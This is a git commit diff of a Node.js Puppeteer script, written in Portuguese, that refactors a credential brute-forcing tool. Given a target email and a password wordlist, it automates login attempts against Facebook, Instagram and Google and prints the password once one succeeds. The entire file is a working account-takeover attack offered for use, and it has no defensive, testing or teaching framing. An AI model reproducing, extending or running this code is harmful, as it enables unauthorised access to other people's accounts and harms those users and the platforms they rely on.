af81e8cdce51521df404f77f21843c6f1fb8ff82
CarlosAllberto <dasilvacarlosalberto344@gmail.com>
2023-04-24 16:04:42 -0300

    atualização

--- index.js
+++ index.js
@@ -1,161 +1,194 @@
-const axios = require("axios");
-const puppeteer = require("puppeteer");
-const StealthPlugin = require("puppeteer-extra-plugin-stealth");
-const { ArgumentParser } = require("argparse");
-const fs = require("fs");
-//require('dotenv').config({ path: 'config.env' });
-require("colors");
+const axios = require("axios")
+const puppeteer = require("puppeteer")
+const { ArgumentParser } = require("argparse")
+const fs = require("fs")
+require("colors")
 
-//puppeteer.use(StealthPlugin());
-
-const parser = new ArgumentParser({
-  description: "parameters example"
-});
+const parser = new ArgumentParser({ description: "parameters example" })
 
 const banner = `
-█████████
-█▄█████▄█
-█▼ ▼ ▼ ▼
-█      Author: CarlosAllberto
-█▲ ▲ ▲ ▲
-█████████
-_██___██___
-`;
+                        _
+                       //
+                      //
+             _.-\`\`\`\`'//_
+         ,-'\`       //  \`'-.,_
+ /)     (\         //        '\`\`-.
+( ( .,-') )       //             \`\`
+ \)'   (_/       \`#'              !!
+  |       /)     ###   '          !!!
+  \`\    X'       ###  '     !    !!!!
+    !      _/! , !## !  ! !  !   !!!
+     \Y,   |!!!  ! #! !!  !! !!!!!!!
+       \`!!! !!!! !!# )!!!!!!!!!!!!!
+        !!  ! ! \( \(  !!!|/!  |/!
+               /_(/#(    /_(  /_(
+                 %%%%
+                %%%%%%%
+                 %%%%%%%
+                   %%%%
+                      %%
+`
 
-parser.add_argument("-s", "--site",  { help: "facebook, instagram, google" });
-parser.add_argument("-e", "--email", { help: "email or id" });
-parser.add_argument("-p", "--password", { help: "password file with wordlist.txt" });
+parser.add_argument("-s", "--site",  { help: "facebook, instagram, google" })
+parser.add_argument("-e", "--email", { help: "email or id" })
+parser.add_argument("-p", "--password", { help: "password file with wordlist.txt" })
 
-const argSite = parser.parse_args().site;
-const argEmail = parser.parse_args().email;
-const argPassword = parser.parse_args().password;
+const { site, email, password } = parser.parse_args()
+
+const userAgent = "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
+const viewPort = { width: 1006, height: 550 }
 
 class brute {
   constructor(site, email, passwordFile) {
-    this.site = site;
-    this.email = email;
-    this.passwordFile = passwordFile;
-    console.clear();
-    console.log(banner.bold.green);
+    this.site = site
+    this.email = email
+    this.passwordFile = passwordFile
+    console.clear()
+    console.log(banner.bold)
+    console.log(`COMEÇANDO O ATAQUE EM: ${this.site}\n`.bold.green)
   }
 
-  test() {
-    axios.get("https://http.cat")
-    .then(() => {
-      //pass
-    })
-    .catch(() => {
-      console.log("\n[!] INTERNET: OFF\n".underline.yellow);
-      process.exit(1);
-    });
+  async test() {
+    try { await axios.get("https://http.cat") } 
+    catch {
+      console.log("\n[!] INTERNET: OFF\n".underline.yellow)
+      process.exit(1)
+    }
   }
 
   testFile() {
-    fs.readFile(this.passwordFile, { encoding: "utf-8" }, (err, data) => {
+    fs.readFile(this.passwordFile, { encoding: "utf-8" }, err => {
       if (err) {
-        console.log("\n[!] NÃO FOI POSSIVEL ENCONTRAR A WORDLIST\n".underline.yellow);
-        process.exit(1);
+        console.log("\n[!] NÃO FOI POSSIVEL ENCONTRAR A WORDLIST\n".underline.yellow)
+        process.exit(1)
       }
-    });
+    })
   }
 
   loadConfig() {
-    let data = fs.readFileSync("./config.json", { encoding: "utf-8" });
-    let dataParse = JSON.parse(data);
+    let data = fs.readFileSync("./config.json", { encoding: "utf-8" })
+    let dataParse = JSON.parse(data)
     let config
     switch(this.site) {
       case "facebook":
-        config = dataParse.facebook;
-        break;
+        config = dataParse.facebook
+        break
+      case "instagram":
+        config = dataParse.instagram
+        break
       case "pinterest":
-        config = dataParse.pinterest;
-        break;
+        config = dataParse.pinterest
+        break
       case "google":
-        config = dataParse.google;
-        break;
+        config = dataParse.google
     }
-    return config;
+    return config
   }
 
-  attackGoogle() {
-    let config = new brute(site=argSite).loadConfig();
-    this.testFile();
-    let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
-    console.log(`COMEÇANDO O ATAQUE EM: google`.bold.green);
-    (async () => {
-      let browser = await puppeteer.launch({
-        args: ['--no-sandbox'],
-        headless: false,
-      });
-      let page = await browser.newPage();
-      await page.setUserAgent("Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0");
-      await page.setExtraHTTPHeaders({
-        'accept-language': 'en-US,en;q=0.9,hy;q=0.8'
-      });
-      await page.setViewport({
-        width: 1006,
-        height: 550
-      });
-      for(let password of data.split(/\r?\n/)) {
-        await page.goto(config.url);
-        await page.type(config.inputEmail, this.email);
-        await page.click(config.buttonSubmit);
-        //await page.waitForNavigation(); 
-        await page.type(config.inputPassword, password);
-        await page.click(config.buttonSubmit);
-        await page.waitForNavigation();
-        let urlPage = page.url();
-        let pageContent = await page.content();
-        if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
-          console.log(`[-] SENHA ERRADA: ${password}`.red);
-          await page.goBack();
-        } else {
-          console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green);
-          break;
-        }
+  async attackGoogle() {
+    let config = this.loadConfig()
+    let { url, inputEmail, inputPassword, buttonSubmit, msgError } = config
+    this.testFile()
+    let passwordList = fs.readFileSync(this.passwordFile, { encoding: "utf-8" })
+
+    let browser = await puppeteer.launch({ args: ['--no-sandbox'], headless: false })
+
+    let page = await browser.newPage()
+    await page.setExtraHTTPHeaders({ "accept-language": "en-US,en;q=0.9,hy;q=0.8" })
+    await page.setUserAgent(userAgent)
+    await page.setViewport(viewPort)
+    for(let password of passwordList.split(/\r?\n/)) {
+      await page.goto(url)
+      await page.type(inputEmail, this.email)
+      await page.click(buttonSubmit)
+      await page.waitForNavigation()
+      await page.type(inputPassword, password)
+      await page.click(buttonSubmit)
+      await page.waitForNavigation()
+      let pageContent = await page.content()
+      let urlPage = page.url()
+      if(urlPage === url || pageContent.indexOf(msgError) !== -1) {
+        console.log(`[-] SENHA ERRADA: ${password}`.red)
+      } else {
+        console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green)
+        break
       }
-    })();
+    }
   }
 
-  attack() {
-    let config = new brute(site=argSite).loadConfig();
-    this.testFile();
-    let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
-    console.log(`COMEÇANDO O ATAQUE EM: ${this.site}\n`.bold.green);
-    (async () => {
-      let browser = await puppeteer.launch({
-        args: ['--no-sandbox'],
-        headless: false,
-      });
-      let page = await browser.newPage();
-      await page.setUserAgent("Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0");
-      await page.setViewport({
-        width: 1006,
-        height: 550
-      });
-      for(let password of data.split(/\r?\n/)) {
-        await page.goto(config.url);
-        await page.type(config.inputEmail, this.email);
-        await page.type(config.inputPassword, password);
-        await page.click(config.buttonSubmit);
-        await page.waitForNavigation();
-        let urlPage = page.url();
-        let pageContent = await page.content();
-        if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
-          console.log(`[-] SENHA ERRADA: ${password}`.red);
-          await page.goBack();
-        } else {
-          console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green);
-          break;
-        }
+  async attackFacebook() {
+    let config = this.loadConfig()
+    let { url, inputEmail, inputPassword, buttonSubmit, msgError } = config
+    this.testFile()
+    let passwordList = fs.readFileSync(this.passwordFile, { encoding: "utf-8" })
+    
+    let browser = await puppeteer.launch({ args: ['--no-sandbox'], headless: false })
+
+    let page = await browser.newPage()
+    await page.setUserAgent(userAgent)
+    await page.setViewport(viewPort)
+
+    await page.goto(url)
+    await page.type(inputEmail, this.email)
+    for(let password of passwordList.split(/\r?\n/)) {
+      await page.type(inputPassword, password)
+      await page.click(buttonSubmit)
+      await page.waitForNavigation()
+      let pageContent = await page.content()
+      let urlPage = page.url()
+      if(urlPage === url || pageContent.indexOf(msgError) !== -1) {
+        console.log(`[-] SENHA ERRADA: ${password}`.red)
+        await page.goBack()
+      } else {
+        console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green)
+        break
       }
-    })();
+    }
+  }
+
+  async attackInstagram() {
+    let config = this.loadConfig()
+    let { url, inputEmail, inputPassword, buttonSubmit, msgError } = config
+    this.testFile()
+    let passwordList = fs.readFileSync(this.passwordFile, { encoding: "utf-8" })
+    
+    let browser = await puppeteer.launch({ args: ['--no-sandbox'], headless: false })
+
+    let page = await browser.newPage()
+    await page.setExtraHTTPHeaders({ "accept-language": "en-US,en;q=0.9,hy;q=0.8" })
+    await page.setUserAgent(userAgent)
+    await page.setViewport(viewPort)
+
+    await page.goto(url)
+    
+    for(let password of passwordList.split(/\r?\n/)) {
+      await page.type(inputEmail, this.email)
+      await page.type(inputPassword, password)
+      await page.click(buttonSubmit)
+      let pageContent = await page.content()
+      let urlPage = page.url()
+      if(urlPage === url || pageContent.indexOf(msgError) !== -1) {
+        console.log(`[-] SENHA ERRADA: ${password}`.red)
+        await page.goBack()
+      } else {
+        console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green)
+        break
+      }
+    }
   }
 }
 
-new brute().test();
-if(argSite == "google") {
-  new brute(site=argSite, email=argEmail, passwordFile=argPassword).attackGoogle();
-} else {
-  new brute(site=argSite, email=argEmail, passwordFile=argPassword).attack();
+new brute().test()
+switch(site) {
+  case "facebook":
+    new brute(site, email, password).attackFacebook()
+    break
+  case "instagram":
+    new brute(site, email, password).attackInstagram()
+    break
+  case "pinterest":
+    console.log("ainda não foi feito.")
+    break
+  case "google":
+    new brute(site, email, password).attackGoogle()
 }
